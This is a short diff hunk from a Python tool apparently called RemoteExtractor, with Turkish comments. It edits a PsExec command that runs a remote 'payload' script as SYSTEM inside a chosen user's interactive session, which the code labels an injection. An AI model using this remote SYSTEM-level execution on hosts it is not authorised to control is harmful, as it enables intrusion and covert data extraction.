@@ -67,7 +67,7 @@ class RemoteExtractor:
             # PsExec ile Sesson 0'dan kurtulup hedef kullanicinin ekranina scripti at
             # Not: C:\PSTools dizininin Path'te olmama ihtimaline karsi komut icinde gecici olarak Path'e ekliyoruz.
             # Alternatif olarak python kurulusu oldugu varsayilmaktadir.
-            psexec_cmd = f'cmd.exe /c "set PATH=C:\\PSTools;%PATH% && psexec -i {session_id} -s -d -accepteula python {payload_remote_path} {temp_dir}"'
+            psexec_cmd = f'cmd.exe /c "set PATH=C:\\PSTools;%PATH% && psexec -i {session_id} -s -d -accepteula cmd.exe /c python {payload_remote_path} {temp_dir}"'
             print(f"[{self.host}] PsExec Enjeksiyon komutu atiliyor...")
             
             # Asenkron tetikledigimiz icin scriptin bitmesini (dosyalarin uretilmesini) bekle
